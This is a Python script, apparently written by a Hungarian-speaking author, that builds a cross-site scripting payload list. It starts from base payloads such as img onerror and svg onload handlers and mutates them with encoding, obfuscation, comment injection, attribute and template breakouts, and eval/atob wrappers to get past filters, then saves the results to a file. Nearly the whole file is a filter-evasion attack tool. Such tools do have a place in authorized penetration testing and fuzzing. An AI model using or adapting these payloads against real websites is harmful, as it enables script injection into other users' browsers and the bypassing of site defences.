import urllib.parse
import html
import base64

class XSSPayloadGenerator:
    def __init__(self):
        self.base_payloads = set([
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<img src=x onerror=confirm(1)>',
            '<svg/onload=prompt(1)>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg><animate onbegin=alert(1)>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg/onload=alert(1)//>'
        ])
        self.mutated_payloads = set()

    def add_payloads(self, custom_payloads):
        """Add unique custom payloads to the base payload set."""
        if isinstance(custom_payloads, list):
            for payload in custom_payloads:
                if payload not in self.base_payloads:
                    self.base_payloads.add(payload)
        else:
            raise ValueError("Please provide a list of payloads.")

    # Mutációs technikák
    def mutate_functions(self, payload):
        return [
            payload.replace('alert', 'confirm'),
            payload.replace('alert', 'prompt'),
            #payload.replace('alert', 'console.log')
        ]

    def replace_parentheses(self, payload):
        return [payload.replace('(', '`').replace(')', '`')]

    def url_encode(self, payload):
        return [urllib.parse.quote(payload)]
    
    def full_url_encode(self, input_string):
        return [''.join(f'%{ord(char):02X}' for char in input_string)]

    def double_url_encode(self, input_string):
        # Első enkódolás
        first_encoded = ''.join(f'%{ord(char):02X}' for char in input_string)
        # Második enkódolás az első eredményen
        double_encoded = ''.join(f'%{ord(char):02X}' for char in first_encoded)
        return [double_encoded]

    def html_encode(self, payload):
        return [html.escape(payload)]

    def inject_comments(self, payload):
        return [payload.replace('onerror=', 'onerror=/**/'), payload.replace('onload=', 'onload=/**/')]

    def escape_from_attributes(self, payload):
        return [
            f'">{payload}',           
            f"'{payload}'",           
            f'{payload}//'            
        ]

    def js_function_mutation(self, payload):
        base64_payload = base64.b64encode(payload.encode()).decode()
        char_codes = ','.join(str(ord(c)) for c in payload)
        return [
            f'eval("{payload}")',
            f'atob("{base64_payload}")',
            f'(new Function("return {payload}"))()',
            f'String.fromCharCode({char_codes})'
        ]

    def obfuscation_mutation(self, payload):
        return [
            payload.replace('alert', 'al<!-- -->ert'),
            payload.replace('(', '\\x28').replace(')', '\\x29'),
            f'setTimeout("{payload}", 1000)',
            f'`{payload}`'
        ]

    def json_escape_mutation(self, payload):
        """Mutáció JSON kontextusban."""
        return [
            f'{{"key": "{payload}"}}',
            f'\\u003c{payload}\\u003e'
        ]

    def script_template_injection(self, payload):
        """Template literal injection mutáció."""
        return [
            f'${{{payload}}}',
            f'`;{payload}//'
        ]

    def css_escape_mutation(self, payload):
        """CSS context breakout mutáció."""
        return [
            f'background:url("javascript:{payload}");'
        ]

    def advanced_obfuscation(self, payload):
        """Advanced string concatenation and encoding mutáció."""
        hex_payload = ''.join(f'\\x{ord(c):02x}' for c in payload)
        unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
        return [
            hex_payload,
            unicode_payload,
            f'al"+"ert(1)'
        ]

    def generate_payloads(self):
        for payload in self.base_payloads:
            self.mutated_payloads.add(payload)
            
            for mutation_func in [
                self.mutate_functions,
                self.replace_parentheses,
                self.html_encode,
                self.inject_comments,
                self.escape_from_attributes,
                self.js_function_mutation,
                self.obfuscation_mutation,
                self.json_escape_mutation,
                self.script_template_injection,
                self.css_escape_mutation,
                self.advanced_obfuscation
            ]:
                for mutated in mutation_func(payload):
                    self.mutated_payloads.add(mutated)
                    self.mutated_payloads.add(self.url_encode(mutated)[0])
                    self.mutated_payloads.add(self.full_url_encode(mutated)[0])
                    self.mutated_payloads.add(self.double_url_encode(mutated)[0])
                    

        return list(self.mutated_payloads)

    def save_to_file(self, filename='xss_payloads.txt'):
        all_payloads = self.generate_payloads()
        with open(filename, 'w') as f:
            for p in all_payloads:
                f.write(p + '\n')
        print(f"Generated {len(all_payloads)} unique payloads and saved to {filename}.")



